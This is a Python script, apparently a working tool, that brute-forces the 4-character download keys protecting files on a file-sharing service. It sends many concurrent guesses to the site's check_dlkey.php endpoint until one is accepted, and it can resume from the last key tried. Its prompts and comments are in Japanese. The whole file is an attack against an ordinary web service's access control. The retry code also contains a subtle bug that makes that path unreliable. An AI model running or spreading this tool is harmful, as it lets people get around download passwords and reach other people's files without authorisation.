import aiohttp, asyncio
from iter_func import iter_func
from tqdm import tqdm
from time import sleep

async def check_dlkey(url, dlkey, is_zip, pbar):
    _, _, server, file = url.split("/")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url = "https://"+server+"/check_dlkey.php",
                params={
                    "file": file,
                    "dlkey": dlkey,
                    "is_zip": 1 if is_zip else 0,
                }
            ) as response:
                if response.status == 200:
                    json = await response.json()
                    if json["status"] == 0:
                        pbar.write(f"key(?) = {dlkey}")
                        return [0, dlkey]
                    elif json["status"] == 1:
                        return [1, dlkey]
                    elif json["status"] == 2:
                        return [2, dlkey]
                else:
                    if response.status == 503: return [3, dlkey]
                    raise Exception(f"HTTPリクエストに失敗 status: {response.status}\n試行していたキー: {dlkey}")
    except OSError:
        #raise Exception(f"HTTPリクエストに失敗 status: {response.status}\n試行していたキー: {dlkey}")
        return [2, dlkey]

async def main():
    ite = iter_func(lambda x: x, "????", base_str, begin_at=begin_at)
    total = ite.__len__()
    with tqdm(total=total) as pbar:
        while True:
            try:
                tasks = [check_dlkey(url, s, is_zip, pbar) for s in [next(ite) for _ in range(nump)]]
            except StopIteration:
                if total % nump != 0:
                    res = await asyncio.gather(*tasks)
                    for r in res:
                        pbar.update(1)
                        if r[0] == 0:
                            return
                        elif r[0] in [2 , 3]:
                            sleep(0.2)
                            if (res := await check_dlkey(url, r[1], is_zip, pbar)[0]) == 2: raise Exception(f"2回連続で失敗しました 試行していたキー: {r[1]}")
                            elif res == 0: return
            res = await asyncio.gather(*tasks)
            for r in res:
                pbar.update(1)
                if r[0] == 0:
                    return
                elif r[0] in [2 , 3]:
                    sleep(0.2)
                    if (res := await check_dlkey(url, r[1], is_zip, pbar)[0]) == 2: raise Exception(f"2回連続で失敗しました 試行していたキー: {r[1]}")
                    elif res == 0: return

url = input("URLを入力してください(短縮URLはエラー吐きます): ")
is_zip = input("zip(まとめてダウンロード)?(y/n): ").lower() == "y"
nump = 6 #最大同時実行数
try:
    nump = int(input("同時実行数を入力してください。8以下をおすすめします。"))
except ValueError:
    print("無効な値が入力されました。初期値として6を使用します。")
base_str = "abcdefghijklmnopqrstuvwxyz"
base_str += base_str.upper() + "0123456789"
if input("数字のみ探索しますか?\n英字を探索しない代わりに、探索にかかる時間が約1/1478になります。(y/n)").lower() == "y": base_str = "1234567890"
begin_at = input("前回エラー終了した場合は、\nここで前回最後に試行していたキーを入力してください。")
if len(begin_at)!=4: begin_at=None
asyncio.run(main())
